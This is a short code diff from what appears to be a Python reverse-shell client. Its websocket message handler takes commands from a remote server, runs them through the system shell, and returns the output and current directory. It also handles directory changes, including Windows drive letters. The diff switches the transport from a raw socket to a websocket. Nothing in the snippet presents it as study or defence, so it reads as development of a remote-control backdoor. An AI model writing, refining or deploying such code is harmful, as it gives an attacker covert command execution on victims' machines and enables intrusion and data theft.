@@ -12,18 +12,17 @@ def on_message(ws, cmd):
     if cmd.startswith("cd "):
         os.chdir(cmd[3:])
         x1 = f'{os.getcwd()}>'
-        s.send(x1.encode())
-        continue
+        ws.send(x1.encode())
     if len(cmd) == 2 and ":" in cmd:
         os.chdir(cmd)
         x2 = f'{os.getcwd()}>'
-        s.send(x2.encode())
+        ws.send(x2.encode())
 
     if len(cmd) > 0:
         p = subprocess.run(cmd, shell=True, capture_output=True)
         data = p.stdout + p.stderr
         x3 = f'{os.getcwd()}>'
-        s.sendall(data + x3.encode())
+        ws.send(data + x3.encode())
 
 def on_open(ws):
     print("WebSocket connection established")
